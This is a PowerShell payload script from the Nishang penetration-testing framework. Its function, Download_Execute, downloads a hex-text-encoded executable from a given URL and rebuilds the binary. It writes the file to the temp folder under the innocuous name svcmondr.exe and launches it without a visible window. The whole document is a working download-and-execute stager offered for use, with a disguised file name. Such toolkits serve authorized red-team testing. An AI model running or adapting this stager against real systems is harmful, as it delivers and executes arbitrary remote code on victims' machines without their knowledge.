
<#
.SYNOPSIS
Nishang Payload to download an executable in text format, convert it to executable and execute.

.DESCRIPTION
This payload downloads an executable in text format, converts it to executable and execute.
Use exetotext.ps1 script to change an executable to text

.PARAMETER URL
The URL from where the file would be downloaded.

.EXAMPLE
PS > Download_Execute http://example.com/file.txt

.LINK
http://labofapenetrationtester.blogspot.com/
https://github.com/samratashok/nishang
#>



function Download_Execute
{
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $URL
    )

    $webclient = New-Object System.Net.WebClient
    [string]$hexformat = $webClient.DownloadString($URL) 
    [Byte[]] $temp = $hexformat -split ' ' 
    [System.IO.File]::WriteAllBytes("$env:temp\svcmondr.exe", $temp) 
    start-process -nonewwindow "$env:temp\svcmondr.exe" 
}
